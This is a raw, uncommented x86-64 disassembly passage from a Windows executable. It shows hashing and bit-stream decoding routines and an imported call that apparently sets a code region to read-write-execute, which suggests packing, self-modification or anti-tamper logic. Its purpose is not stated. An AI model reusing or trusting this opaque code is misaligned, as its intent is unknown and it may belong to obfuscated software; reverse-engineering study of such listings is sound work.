   14004e869:	mov    BYTE PTR [rip+0x4a21e],0x0        # 0x140098a8e
   14004e870:	mov    eax,DWORD PTR [rbp+0x7d0]
   14004e876:	add    DWORD PTR [rbp+0xd88],eax
   14004e87c:	mov    eax,DWORD PTR [rbp+0x7d4]
   14004e882:	add    DWORD PTR [rbp+0xd8c],eax
   14004e888:	mov    eax,DWORD PTR [rbp+0x7d8]
   14004e88e:	add    DWORD PTR [rbp+0xd90],eax
   14004e894:	mov    eax,DWORD PTR [rbp+0x7dc]
   14004e89a:	add    DWORD PTR [rbp+0xd94],eax
   14004e8a0:	mov    eax,DWORD PTR [rbp+0x7e0]
   14004e8a6:	add    DWORD PTR [rbp+0xd98],eax
   14004e8ac:	mov    BYTE PTR [rip+0x4a1d9],0x0        # 0x140098a8c
   14004e8b3:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   14004e8ba:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   14004e8c1:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   14004e8c8:	xor    eax,eax
   14004e8ca:	cmp    rax,0x14
   14004e8ce:	je     0x14004e8e6
   14004e8d0:	mov    ecx,DWORD PTR [rbp+rax*1+0xd88]
   14004e8d7:	bswap  ecx
   14004e8d9:	mov    DWORD PTR [rbp+rax*1+0x7d0],ecx
   14004e8e0:	add    rax,0x4
   14004e8e4:	jmp    0x14004e8ca
   14004e8e6:	mov    r8,QWORD PTR [rbp+0xd20]
   14004e8ed:	mov    eax,r13d
   14004e8f0:	shr    eax,0x3
   14004e8f3:	and    eax,0x1f
   14004e8f6:	lea    rcx,[rax+rbp*1]
   14004e8fa:	add    rcx,0x7d0
   14004e901:	xor    r9d,r9d
   14004e904:	xor    edx,edx
   14004e906:	xor    eax,eax
   14004e908:	cmp    r9,0x10
   14004e90c:	je     0x14004e927
   14004e90e:	shld   rax,rdx,0x8
   14004e913:	mov    r10,rdx
   14004e916:	shl    r10,0x8
   14004e91a:	movzx  edx,BYTE PTR [rcx+r9*1]
   14004e91f:	inc    r9
   14004e922:	or     rdx,r10
   14004e925:	jmp    0x14004e908
   14004e927:	push   0xffffffffffffffff
   14004e929:	pop    r9
   14004e92b:	mov    r10,r9
   14004e92e:	mov    ecx,r8d
   14004e931:	shl    r10,cl
   14004e934:	cmp    r8,0x40
   14004e938:	not    r10
   14004e93b:	cmovae r10,r9
   14004e93f:	and    r13d,0x7
   14004e943:	lea    ecx,[r8+r13*1]
   14004e947:	neg    cl
   14004e949:	shrd   rdx,rax,cl
   14004e94d:	shr    rax,cl
   14004e950:	test   cl,0x40
   14004e953:	cmove  rax,rdx
   14004e957:	and    rax,r10
   14004e95a:	mov    rsi,QWORD PTR [rbp+0xd60]
   14004e961:	add    r8,0x7
   14004e965:	bswap  rax
   14004e968:	shr    r8,0x3
   14004e96c:	mov    QWORD PTR [rbp+0x1060],rax
   14004e973:	mov    r9,rsi
   14004e976:	imul   r9,r8
   14004e97a:	push   0x8
   14004e97c:	pop    rcx
   14004e97d:	sub    rcx,r8
   14004e980:	dec    r8
   14004e983:	mov    rax,QWORD PTR [rbp+0x1168]
   14004e98a:	lea    r11,[rax+r9*1]
   14004e98e:	mov    rax,r9
   14004e991:	xor    edx,edx
   14004e993:	push   0x14
   14004e995:	pop    rdi
   14004e996:	div    rdi
   14004e999:	cmp    rcx,0x8
   14004e99d:	je     0x14004e9c3
   14004e99f:	cmp    r8,0x7
   14004e9a3:	ja     0x140059d80
   14004e9a9:	imul   rax,rax,0xffffffffffffffec
   14004e9ad:	mov    al,BYTE PTR [r11+rax*1]
   14004e9b1:	xor    BYTE PTR [rbp+rcx*1+0x1060],al
   14004e9b8:	inc    rcx
   14004e9bb:	inc    r11
   14004e9be:	inc    r9
   14004e9c1:	jmp    0x14004e98e
   14004e9c3:	mov    r11,QWORD PTR [rbp+0x1060]
   14004e9ca:	bswap  r11
   14004e9cd:	and    r11,r10
   14004e9d0:	inc    rsi
   14004e9d3:	mov    QWORD PTR [rbp+0xd60],rsi
   14004e9da:	mov    r9,QWORD PTR [rbp+0xdd0]
   14004e9e1:	mov    rax,QWORD PTR [rbp+0xdc0]
   14004e9e8:	mov    r8,QWORD PTR [rbp+0xdc8]
   14004e9ef:	mov    rdx,r9
   14004e9f2:	sub    rdx,r8
   14004e9f5:	sub    rdx,rax
   14004e9f8:	mov    rcx,QWORD PTR [rbp+0xd20]
   14004e9ff:	cmp    rdx,rcx
   14004ea02:	cmovae rdx,rcx
   14004ea06:	cmp    rdx,0x1
   14004ea0a:	adc    rdx,0x0
   14004ea0e:	mov    r10d,ecx
   14004ea11:	sub    r10d,edx
   14004ea14:	and    r10b,0x3f
   14004ea18:	cmp    rcx,rdx
   14004ea1b:	movzx  ecx,r10b
   14004ea1f:	mov    r10d,0x0
   14004ea25:	cmovbe ecx,r10d
   14004ea29:	shr    r11,cl
   14004ea2c:	mov    r10,QWORD PTR [rbp+0xdb0]
   14004ea33:	mov    rsi,QWORD PTR [rbp+0xdb8]
   14004ea3a:	mov    ecx,edx
   14004ea3c:	shld   rsi,r10,cl
   14004ea40:	shl    r10,cl
   14004ea43:	test   dl,0x40
   14004ea46:	cmovne rsi,r10
   14004ea4a:	mov    ecx,0x0
   14004ea4f:	cmove  rcx,r10
   14004ea53:	or     rcx,r11
   14004ea56:	mov    QWORD PTR [rbp+0xdb8],rsi
   14004ea5d:	mov    QWORD PTR [rbp+0xdb0],rcx
   14004ea64:	add    rax,rdx
   14004ea67:	mov    QWORD PTR [rbp+0xdc0],rax
   14004ea6e:	jmp    0x14004e516
   14004ea73:	add    rax,0xfffffffffffffff8
   14004ea77:	mov    QWORD PTR [rbp+0xdc0],rax
   14004ea7e:	mov    r9,QWORD PTR [rbp+0xdb8]
   14004ea85:	mov    r10,r9
   14004ea88:	mov    ecx,eax
   14004ea8a:	shr    r10,cl
   14004ea8d:	mov    r11,QWORD PTR [rbp+0xdb0]
   14004ea94:	mov    rdx,r11
   14004ea97:	shrd   rdx,r9,cl
   14004ea9b:	push   0xffffffffffffffff
   14004ea9d:	pop    rdi
   14004ea9e:	mov    rsi,rdi
   14004eaa1:	shl    rsi,cl
   14004eaa4:	test   al,0x40
   14004eaa6:	cmovne rdx,r10
   14004eaaa:	mov    ecx,0x0
   14004eaaf:	cmove  rcx,rsi
   14004eab3:	cmove  rsi,rdi
   14004eab7:	not    rsi
   14004eaba:	not    rcx
   14004eabd:	and    rcx,r11
   14004eac0:	and    rsi,r9
   14004eac3:	test   rax,rax
   14004eac6:	cmove  rsi,rax
   14004eaca:	cmove  rcx,rax
   14004eace:	mov    QWORD PTR [rbp+0xdb0],rcx
   14004ead5:	mov    QWORD PTR [rbp+0xdb8],rsi
   14004eadc:	add    r8,0x8
   14004eae0:	mov    QWORD PTR [rbp+0xdc8],r8
   14004eae7:	inc    rbx
   14004eaea:	lea    rcx,[rbp+0x500]
   14004eaf1:	call   0x14003c141
   14004eaf6:	jmp    0x14004e4e7
   14004eafb:	mov    r15,QWORD PTR [rbp+0x500]
   14004eb02:	mov    r13,QWORD PTR [rbp+0x508]
   14004eb09:	mov    rsi,QWORD PTR [rbp+0x510]
   14004eb10:	add    rsi,r13
   14004eb13:	mov    QWORD PTR [rbp+0x7d0],r13
   14004eb1a:	mov    QWORD PTR [rbp+0x7d8],rsi
   14004eb21:	mov    QWORD PTR [rbp+0x7e0],0x8
   14004eb2c:	and    QWORD PTR [rbp+0x7e8],0x0
   14004eb34:	xor    edi,edi
   14004eb36:	lea    rcx,[rbp+0x7d0]
   14004eb3d:	call   0x14003ba96
   14004eb42:	test   rdx,rdx
   14004eb45:	je     0x14004eb57
   14004eb47:	movzx  edx,BYTE PTR [rdx]
   14004eb4a:	shl    eax,0x3
   14004eb4d:	mov    ecx,eax
   14004eb4f:	shl    rdx,cl
   14004eb52:	or     rdi,rdx
   14004eb55:	jmp    0x14004eb36
   14004eb57:	mov    r9,rdi
   14004eb5a:	movabs rax,0x4f1bbcdca8279931
   14004eb64:	imul   r9,rax
   14004eb68:	rol    r9,0x11
   14004eb6c:	xor    r9,rdi
   14004eb6f:	mov    r10,r9
   14004eb72:	movabs rax,0x6b1f30a8d4c752e9
   14004eb7c:	xor    r10,rax
   14004eb7f:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   14004eb86:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   14004eb8d:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   14004eb94:	movaps XMMWORD PTR [rbp+0x800],xmm7
   14004eb9b:	movaps XMMWORD PTR [rbp+0x810],xmm7
   14004eba2:	movaps XMMWORD PTR [rbp+0x820],xmm7
   14004eba9:	movaps XMMWORD PTR [rbp+0x830],xmm7
   14004ebb0:	movaps XMMWORD PTR [rbp+0x840],xmm7
   14004ebb7:	movabs rax,0x1f91b0e3369d229e
   14004ebc1:	xor    r9,rax
   14004ebc4:	mov    r11,r10
   14004ebc7:	or     r11,0x1
   14004ebcb:	rol    r11,0x15
   14004ebcf:	lea    rdi,[r12+0x1]
   14004ebd4:	xor    ebx,ebx
   14004ebd6:	cmp    rbx,0x10
   14004ebda:	je     0x14004eca6
   14004ebe0:	mov    rax,rbx
   14004ebe3:	movabs rcx,0x32a27dbe0b6bcf37
   14004ebed:	imul   rax,rcx
   14004ebf1:	rol    rax,0x20
   14004ebf5:	xor    rax,r10
   14004ebf8:	mov    rcx,r11
   14004ebfb:	push   0x7
   14004ebfd:	pop    rdx
   14004ebfe:	mov    r8,r9
   14004ec01:	sub    edx,0x1
   14004ec04:	jb     0x14004ec3a
   14004ec06:	mov    r14,rcx
   14004ec09:	xor    r14,rax
   14004ec0c:	add    r14,r8
   14004ec0f:	rol    r14,0x28
   14004ec13:	add    rax,r14
   14004ec16:	rol    rax,0xf
   14004ec1a:	mov    r8,rax
   14004ec1d:	shr    r8,0x1d
   14004ec21:	xor    rax,r8
   14004ec24:	movabs r8,0x79ca1cd2f36bd757
   14004ec2e:	imul   r14,r8
   14004ec32:	add    rcx,r11
   14004ec35:	mov    r8,r14
   14004ec38:	jmp    0x14004ec01
   14004ec3a:	lea    rcx,[rbx*4+0x4]
   14004ec42:	xor    r14d,r14d
   14004ec45:	cmp    rcx,QWORD PTR [rbp+0x1148]
   14004ec4c:	ja     0x14004ec61
   14004ec4e:	lea    rcx,[rbx*4+0x0]
   14004ec56:	mov    rdx,QWORD PTR [rbp+0x1160]
   14004ec5d:	mov    r14d,DWORD PTR [rdx+rcx*1]
   14004ec61:	xor    r8,rax
   14004ec64:	mov    rax,r8
   14004ec67:	shr    rax,0x18
   14004ec6b:	xor    edx,edx
   14004ec6d:	push   0x1f
   14004ec6f:	pop    rcx
   14004ec70:	div    ecx
   14004ec72:	lea    ecx,[rdx+0x1]
   14004ec75:	ror    r14d,cl
   14004ec78:	mov    rax,r8
   14004ec7b:	shr    rax,0x10
   14004ec7f:	mov    rcx,r8
   14004ec82:	shr    rcx,0x28
   14004ec86:	xor    ecx,eax
   14004ec88:	xor    r8d,ecx
   14004ec8b:	xor    r8d,r14d
   14004ec8e:	mov    rax,r8
   14004ec91:	xor    edx,edx
   14004ec93:	div    rdi
   14004ec96:	mov    QWORD PTR [rbp+rbx*8+0x7d0],rdx
   14004ec9e:	inc    rbx
   14004eca1:	jmp    0x14004ebd6
   14004eca6:	and    QWORD PTR [rbp+0xf80],0x0
   14004ecae:	mov    QWORD PTR [rbp+0x1060],r13
   14004ecb5:	mov    QWORD PTR [rbp+0x1068],rsi
   14004ecbc:	mov    QWORD PTR [rbp+0x1070],0x8
   14004ecc7:	and    QWORD PTR [rbp+0x1078],0x0
   14004eccf:	lea    rcx,[rbp+0x1060]
   14004ecd6:	call   0x14003ba96
   14004ecdb:	test   rdx,rdx
   14004ecde:	je     0x14004ecf5
   14004ece0:	cmp    rax,0x7
   14004ece4:	ja     0x14004a57a
   14004ecea:	mov    cl,BYTE PTR [rdx]
   14004ecec:	mov    BYTE PTR [rbp+rax*1+0xf80],cl
   14004ecf3:	jmp    0x14004eccf
   14004ecf5:	mov    ecx,0x80
   14004ecfa:	lea    rdi,[rbp+0x1060]
   14004ed01:	lea    rsi,[rbp+0x7d0]
   14004ed08:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   14004ed0a:	mov    rsi,QWORD PTR [rbp+0xf80]
   14004ed11:	mov    rcx,r15
   14004ed14:	mov    rdx,r13
   14004ed17:	call   0x14006f7f7
   14004ed1c:	mov    rcx,QWORD PTR [rbp+0xf68]
   14004ed23:	mov    rdx,QWORD PTR [rbp+0x1160]
   14004ed2a:	call   0x14006f7f7
   14004ed2f:	mov    QWORD PTR [rbp+0x640],rsi
   14004ed36:	mov    rax,QWORD PTR [rbp+0xd58]
   14004ed3d:	sub    QWORD PTR [rbp+0xca8],rax
   14004ed44:	jb     0x14005a158
   14004ed4a:	mov    ecx,DWORD PTR [rbp+0x6c8]
   14004ed50:	mov    DWORD PTR [rbp+0xf80],ecx
   14004ed56:	mov    ecx,DWORD PTR [rbp+0x1134]
   14004ed5c:	mov    DWORD PTR [rbp+0xf84],ecx
   14004ed62:	mov    ecx,DWORD PTR [rbp+0x6c0]
   14004ed68:	mov    DWORD PTR [rbp+0xf88],ecx
   14004ed6e:	mov    ecx,DWORD PTR [rbp+0xcb8]
   14004ed74:	mov    DWORD PTR [rbp+0xf8c],ecx
   14004ed7a:	mov    ecx,DWORD PTR [rbp+0x5f0]
   14004ed80:	mov    DWORD PTR [rbp+0xf90],ecx
   14004ed86:	je     0x14005a158
   14004ed8c:	mov    rsi,QWORD PTR [rbp+0x1180]
   14004ed93:	add    rsi,rax
   14004ed96:	mov    rcx,QWORD PTR [rbp+0x1158]
   14004ed9d:	lea    rdx,[rbp+0xf80]
   14004eda4:	call   0x14003ad8d
   14004eda9:	mov    eax,DWORD PTR [rbp+0xf90]
   14004edaf:	lea    rdx,[rbp+0x7d8]
   14004edb6:	mov    DWORD PTR [rdx+0x80],eax
   14004edbc:	movups xmm0,XMMWORD PTR [rbp+0xf80]
   14004edc3:	movups XMMWORD PTR [rdx+0x70],xmm0
   14004edc7:	mov    rax,QWORD PTR [rbp+0x730]
   14004edce:	lea    rcx,[rbp+0x7e8]
   14004edd5:	mov    QWORD PTR [rcx+0x20],rax
   14004edd9:	mov    r9,QWORD PTR [rbp+0xf70]
   14004ede0:	shr    r9,0x3d
   14004ede4:	mov    r8,QWORD PTR [rbp+0x700]
   14004edeb:	lea    rax,[r8*8+0x0]
   14004edf3:	neg    r9
   14004edf6:	mov    r13d,0x0
   14004edfc:	sbb    r13,r13
   14004edff:	or     r13,rax
   14004ee02:	movaps xmm0,XMMWORD PTR [rbp+0x710]
   14004ee09:	movaps xmm1,XMMWORD PTR [rbp+0x720]
   14004ee10:	movups XMMWORD PTR [rcx+0x10],xmm1
   14004ee14:	movups XMMWORD PTR [rcx],xmm0
   14004ee17:	mov    QWORD PTR [rbp+0x1180],rsi
   14004ee1e:	mov    QWORD PTR [rbp+0x7d0],rsi
   14004ee25:	mov    rcx,QWORD PTR [rbp+0xca8]
   14004ee2c:	mov    QWORD PTR [rbp+0x7d8],rcx
   14004ee33:	mov    rax,QWORD PTR [rbp+0x1178]
   14004ee3a:	mov    QWORD PTR [rbp+0x7e0],rax
   14004ee41:	mov    QWORD PTR [rbp+0x810],r8
   14004ee48:	movups XMMWORD PTR [rdx+0x40],xmm7
   14004ee4c:	mov    QWORD PTR [rbp+0x828],rcx
   14004ee53:	mov    rax,QWORD PTR [rbp+0x608]
   14004ee5a:	mov    QWORD PTR [rbp+0x830],rax
   14004ee61:	mov    rax,QWORD PTR [rbp+0x6d8]
   14004ee68:	mov    QWORD PTR [rbp+0x838],rax
   14004ee6f:	mov    rax,QWORD PTR [rbp+0x3f0]
   14004ee76:	mov    QWORD PTR [rbp+0x840],rax
   14004ee7d:	mov    rax,QWORD PTR [rbp+0xcb0]
   14004ee84:	movaps XMMWORD PTR [rax+0x10],xmm7
   14004ee88:	movaps XMMWORD PTR [rax],xmm7
   14004ee8b:	mov    QWORD PTR [rbp+0x890],r13
   14004ee92:	lea    rax,[rbp+0x640]
   14004ee99:	mov    QWORD PTR [rbp+0xf80],rax
   14004eea0:	lea    rax,[rbp+0x648]
   14004eea7:	mov    QWORD PTR [rbp+0xf88],rax
   14004eeae:	mov    QWORD PTR [rbp+0xf90],0x8
   14004eeb9:	and    QWORD PTR [rbp+0xf98],0x0
   14004eec1:	xor    esi,esi
   14004eec3:	lea    rcx,[rbp+0xf80]
   14004eeca:	call   0x14003ba96
   14004eecf:	test   rdx,rdx
   14004eed2:	je     0x14004eee4
   14004eed4:	movzx  edx,BYTE PTR [rdx]
   14004eed7:	shl    eax,0x3
   14004eeda:	mov    ecx,eax
   14004eedc:	shl    rdx,cl
   14004eedf:	or     rsi,rdx
   14004eee2:	jmp    0x14004eec3
   14004eee4:	mov    rax,rsi
   14004eee7:	movabs rcx,0x4f1bbcdca8279931
   14004eef1:	imul   rax,rcx
   14004eef5:	rol    rax,0x11
   14004eef9:	xor    rax,rsi
   14004eefc:	mov    rdx,rax
   14004eeff:	movabs rcx,0x6b1f30a8d4c752e9
   14004ef09:	xor    rdx,rcx
   14004ef0c:	mov    r8,QWORD PTR [rbp+0x1058]
   14004ef13:	movabs rcx,0x32a27dbe0b6bcf37
   14004ef1d:	imul   r8,rcx
   14004ef21:	rol    r8,0x20
   14004ef25:	movabs rcx,0x1f91b0e3369d229e
   14004ef2f:	xor    rax,rcx
   14004ef32:	mov    rcx,rdx
   14004ef35:	mov    QWORD PTR [rbp+0x1d8],r8
   14004ef3c:	xor    rcx,r8
   14004ef3f:	or     rdx,0x1
   14004ef43:	rol    rdx,0x15
   14004ef47:	mov    r8,rdx
   14004ef4a:	push   0x7
   14004ef4c:	pop    r9
   14004ef4e:	sub    r9d,0x1
   14004ef52:	jb     0x14004ef88
   14004ef54:	mov    r10,r8
   14004ef57:	xor    r10,rcx
   14004ef5a:	add    r10,rax
   14004ef5d:	rol    r10,0x28
   14004ef61:	add    rcx,r10
   14004ef64:	rol    rcx,0xf
   14004ef68:	mov    rax,rcx
   14004ef6b:	shr    rax,0x1d
   14004ef6f:	xor    rcx,rax
   14004ef72:	movabs rax,0x79ca1cd2f36bd757
   14004ef7c:	imul   r10,rax
   14004ef80:	add    r8,rdx
   14004ef83:	mov    rax,r10
   14004ef86:	jmp    0x14004ef4e
   14004ef88:	mov    r8,r12
   14004ef8b:	mov    rdx,QWORD PTR [rbp+0x1058]
   14004ef92:	sub    r8,QWORD PTR [rbp+rdx*8+0x1060]
   14004ef9a:	inc    r8
   14004ef9d:	je     0x14005a1ee
   14004efa3:	xor    rax,rcx
   14004efa6:	shr    rax,0x20
   14004efaa:	imul   r12,QWORD PTR [rbp+0x1058]
   14004efb2:	xor    edx,edx
   14004efb4:	div    r8
   14004efb7:	mov    rcx,rdx
   14004efba:	add    rcx,r12
   14004efbd:	mov    eax,0x10000
   14004efc2:	cmp    rcx,rax
   14004efc5:	mov    edx,0x10000
   14004efca:	mov    QWORD PTR [rbp+0x1148],rcx
   14004efd1:	cmovb  rdx,rcx
   14004efd5:	lea    rcx,[rbp+0xcc0]
   14004efdc:	call   0x14003c111
   14004efe1:	xor    ebx,ebx
   14004efe3:	xor    r12d,r12d
   14004efe6:	xor    r14d,r14d
   14004efe9:	xor    edi,edi
   14004efeb:	xor    esi,esi
   14004efed:	xor    r15d,r15d
   14004eff0:	cmp    r15,QWORD PTR [rbp+0x1148]
   14004eff7:	jae    0x14004f5f0
   14004effd:	lea    rax,[rsi+0x8]
   14004f001:	cmp    rax,r13
   14004f004:	jbe    0x14004f00d
   14004f006:	xor    edx,edx
   14004f008:	jmp    0x14004f5dc
   14004f00d:	cmp    rdi,0x8
   14004f011:	jae    0x14004f56a
   14004f017:	cmp    rbx,QWORD PTR [rbp+0x828]
   14004f01e:	jae    0x14004f066
   14004f020:	mov    rax,QWORD PTR [rbp+0x7d8]
   14004f027:	mov    rcx,QWORD PTR [rbp+0x818]
   14004f02e:	cmp    rcx,rax
   14004f031:	jae    0x14004f066
   14004f033:	mov    rdx,QWORD PTR [rbp+0x1180]
   14004f03a:	movzx  r13d,BYTE PTR [rdx+rcx*1]
   14004f03f:	and    r13d,0x7f
   14004f043:	inc    rcx
   14004f046:	cmp    rcx,rax
   14004f049:	jae    0x14004f070
   14004f04b:	mov    rdx,QWORD PTR [rbp+0x1180]
   14004f052:	movzx  edx,BYTE PTR [rdx+rcx*1]
   14004f056:	test   dl,dl
   14004f058:	jns    0x14004f06d
   14004f05a:	shl    r13,0x7
   14004f05e:	and    edx,0x7f
   14004f061:	or     r13,rdx
   14004f064:	jmp    0x14004f043
   14004f066:	xor    edx,edx
   14004f068:	jmp    0x14004f4f5
   14004f06d:	mov    rax,rcx
   14004f070:	mov    QWORD PTR [rbp+0x818],rax
   14004f077:	mov    rax,r13
   14004f07a:	shr    rax,0x8
   14004f07e:	mov    rsi,r13
   14004f081:	shr    rsi,0x28
   14004f085:	movaps XMMWORD PTR [rbp+0x430],xmm7
   14004f08c:	movaps XMMWORD PTR [rbp+0x420],xmm7
   14004f093:	movaps XMMWORD PTR [rbp+0x410],xmm7
   14004f09a:	movaps XMMWORD PTR [rbp+0x400],xmm7
   14004f0a1:	mov    DWORD PTR [rbp+0xf80],eax
   14004f0a7:	lea    rax,[rip+0x38faa]        # 0x140088058
   14004f0ae:	mov    QWORD PTR [rsp+0x20],rax
   14004f0b3:	lea    rcx,[rbp+0x400]
   14004f0ba:	push   0x4
   14004f0bc:	pop    rdx
   14004f0bd:	lea    r8,[rbp+0xf80]
   14004f0c4:	mov    r9,rdx
   14004f0c7:	call   0x1400638fe
   14004f0cc:	mov    BYTE PTR [rbp+0x404],sil
   14004f0d3:	mov    rdi,QWORD PTR [rbp+0x7f0]
   14004f0da:	cmp    QWORD PTR [rbp+0x838],rdi
   14004f0e1:	jbe    0x14004f20d
   14004f0e7:	mov    r9,QWORD PTR [rbp+0x7f8]
   14004f0ee:	cmp    r9,0x4
   14004f0f2:	ja     0x140059d9c
   14004f0f8:	mov    rcx,QWORD PTR [rbp+0x800]
   14004f0ff:	cmp    rcx,0x5
   14004f103:	jae    0x140059dae
   14004f109:	mov    rsi,QWORD PTR [rbp+0x838]
   14004f110:	cmp    rsi,rdi
   14004f113:	je     0x140059dbc
   14004f119:	mov    r8,rsi
   14004f11c:	mov    eax,DWORD PTR [rbp+rcx*4+0x848]
   14004f123:	mov    cl,BYTE PTR [rbp+0x808]
   14004f129:	rol    eax,cl
   14004f12b:	sub    r8,rdi
   14004f12e:	xor    eax,DWORD PTR [rbp+r9*4+0x848]
   14004f136:	xor    edx,edx
   14004f138:	div    r8
   14004f13b:	mov    rbx,rdx
   14004f13e:	mov    rax,QWORD PTR [rbp+0x840]
   14004f145:	mov    QWORD PTR [rbp+0x500],rax
   14004f14c:	cmp    rdi,0x40
   14004f150:	push   0x40
   14004f152:	pop    rax
   14004f153:	cmovae rdi,rax
   14004f157:	movaps XMMWORD PTR [rbp+0xfb0],xmm7
   14004f15e:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   14004f165:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   14004f16c:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   14004f173:	lea    rcx,[rbp+0xf80]
   14004f17a:	mov    rdx,rdi
   14004f17d:	call   0x14003c0b8
   14004f182:	test   rsi,rsi
   14004f185:	je     0x14004f1d3
   14004f187:	mov    rcx,rax
   14004f18a:	mov    r8,rdx
   14004f18d:	mov    rax,rdx
   14004f190:	add    rax,rbx
   14004f193:	mov    r9,QWORD PTR [rbp+0x830]
   14004f19a:	cmp    rax,rsi
   14004f19d:	jbe    0x14004f1bd
   14004f19f:	xor    r10d,r10d
   14004f1a2:	cmp    r8,r10
   14004f1a5:	je     0x14004f1d3
   14004f1a7:	lea    rax,[r10+rbx*1]
   14004f1ab:	xor    edx,edx
   14004f1ad:	div    rsi
   14004f1b0:	mov    al,BYTE PTR [r9+rdx*1]
   14004f1b4:	mov    BYTE PTR [rcx+r10*1],al
   14004f1b8:	inc    r10
   14004f1bb:	jmp    0x14004f1a2
   14004f1bd:	add    r9,rbx
   14004f1c0:	xor    eax,eax
   14004f1c2:	cmp    r8,rax
   14004f1c5:	je     0x14004f1d3
   14004f1c7:	mov    dl,BYTE PTR [r9+rax*1]
   14004f1cb:	mov    BYTE PTR [rcx+rax*1],dl
   14004f1ce:	inc    rax
   14004f1d1:	jmp    0x14004f1c2
   14004f1d3:	mov    rcx,QWORD PTR [rbp+0x7e8]
   14004f1da:	xor    eax,eax
   14004f1dc:	cmp    rdi,rax
   14004f1df:	je     0x14004f20d
   14004f1e1:	cmp    rcx,0x3f
   14004f1e5:	ja     0x140059d8e
   14004f1eb:	mov    edx,eax
   14004f1ed:	and    edx,0x7
   14004f1f0:	mov    dl,BYTE PTR [rbp+rdx*1+0x500]
   14004f1f7:	xor    dl,BYTE PTR [rbp+rax*1+0xf80]
   14004f1fe:	inc    rax
   14004f201:	mov    BYTE PTR [rbp+rcx*1+0x400],dl
   14004f208:	inc    rcx
   14004f20b:	jmp    0x14004f1dc
   14004f20d:	movaps XMMWORD PTR [rbp+0x530],xmm7
   14004f214:	movaps XMMWORD PTR [rbp+0x520],xmm7
   14004f21b:	movaps XMMWORD PTR [rbp+0x510],xmm7
   14004f222:	movaps XMMWORD PTR [rbp+0x500],xmm7
   14004f229:	xor    eax,eax
   14004f22b:	cmp    rax,0x40
   14004f22f:	je     0x14004f247
   14004f231:	mov    ecx,DWORD PTR [rbp+rax*1+0x400]
   14004f238:	bswap  ecx
   14004f23a:	mov    DWORD PTR [rbp+rax*1+0x500],ecx
   14004f241:	add    rax,0x4
   14004f245:	jmp    0x14004f22b
   14004f247:	movups xmm0,XMMWORD PTR [rbp+0x848]
   14004f24e:	mov    eax,DWORD PTR [rbp+0x858]
   14004f254:	movups XMMWORD PTR [rbp+0xf80],xmm0
   14004f25b:	mov    DWORD PTR [rbp+0xf90],eax
   14004f261:	and    DWORD PTR [rbp+0xf94],0x0
   14004f268:	movaps xmm0,XMMWORD PTR [rbp+0x500]
   14004f26f:	movaps xmm1,XMMWORD PTR [rbp+0x510]
   14004f276:	movaps xmm2,XMMWORD PTR [rbp+0x520]
   14004f27d:	movaps xmm3,XMMWORD PTR [rbp+0x530]
   14004f284:	lea    rax,[rbp+0xf98]
   14004f28b:	movups XMMWORD PTR [rax+0x30],xmm3
   14004f28f:	movups XMMWORD PTR [rax+0x20],xmm2
   14004f293:	movups XMMWORD PTR [rax+0x10],xmm1
   14004f297:	movups XMMWORD PTR [rax],xmm0
   14004f29a:	call   0x140064214
   14004f29f:	mov    al,BYTE PTR [rip+0x497e8]        # 0x140098a8d
   14004f2a5:	cmp    al,0x1
   14004f2a7:	je     0x14004f2f0
   14004f2a9:	movzx  eax,al
   14004f2ac:	cmp    eax,0x2
   14004f2af:	je     0x14004f396
   14004f2b5:	and    DWORD PTR [rbp+0x610],0x0
   14004f2bc:	lea    rcx,[rip+0xfffffffffffb1dbd]        # 0x140001080
   14004f2c3:	mov    rdx,QWORD PTR [rbp+0x1150]
   14004f2ca:	push   0x40
   14004f2cc:	pop    r8
   14004f2ce:	lea    r9,[rbp+0x610]
   14004f2d5:	call   QWORD PTR [rip+0x4552d]        # 0x140094808
   14004f2db:	test   eax,eax
   14004f2dd:	sete   cl
   14004f2e0:	inc    cl
   14004f2e2:	mov    BYTE PTR [rip+0x497a5],cl        # 0x140098a8d
   14004f2e8:	test   eax,eax
   14004f2ea:	je     0x14004f396
   14004f2f0:	mov    al,BYTE PTR [rip+0x498c2]        # 0x140098bb8
   14004f2f6:	cmp    al,0x1
   14004f2f8:	je     0x14004f31d
   14004f2fa:	movzx  eax,al
   14004f2fd:	test   eax,eax
   14004f2ff:	jne    0x14004f396
   14004f305:	call   0x140065d51
   14004f30a:	test   rax,rax
   14004f30d:	sete   cl
   14004f310:	inc    cl
   14004f312:	mov    BYTE PTR [rip+0x498a0],cl        # 0x140098bb8
   14004f318:	test   rax,rax
   14004f31b:	je     0x14004f396
   14004f31d:	call   0x140064227
   14004f322:	mov    eax,0xc8c291de
   14004f327:	xchg   DWORD PTR [rip+0x497b3],eax        # 0x140098ae0
   14004f32d:	call   QWORD PTR [rip+0x4531d]        # 0x140094650
   14004f333:	mov    eax,eax
   14004f335:	mov    QWORD PTR [rip+0x48cc4],rax        # 0x140098000
   14004f33c:	lea    rcx,[rbp+0xf80]
   14004f343:	push   0xffffffffffffffff
   14004f345:	pop    rdx
   14004f346:	call   0x140010840
   14004f34b:	xor    eax,eax
   14004f34d:	xchg   DWORD PTR [rip+0x4978d],eax        # 0x140098ae0
   14004f353:	mov    BYTE PTR [rip+0x49734],0x0        # 0x140098a8e
   14004f35a:	mov    eax,DWORD PTR [rbp+0xf80]
   14004f360:	add    DWORD PTR [rbp+0x848],eax
   14004f366:	mov    eax,DWORD PTR [rbp+0xf84]
   14004f36c:	add    DWORD PTR [rbp+0x84c],eax
   14004f372:	mov    eax,DWORD PTR [rbp+0xf88]
   14004f378:	add    DWORD PTR [rbp+0x850],eax
   14004f37e:	mov    eax,DWORD PTR [rbp+0xf8c]
   14004f384:	add    DWORD PTR [rbp+0x854],eax
   14004f38a:	mov    eax,DWORD PTR [rbp+0xf90]
   14004f390:	add    DWORD PTR [rbp+0x858],eax
   14004f396:	mov    BYTE PTR [rip+0x496ef],0x0        # 0x140098a8c
   14004f39d:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   14004f3a4:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   14004f3ab:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   14004f3b2:	xor    eax,eax
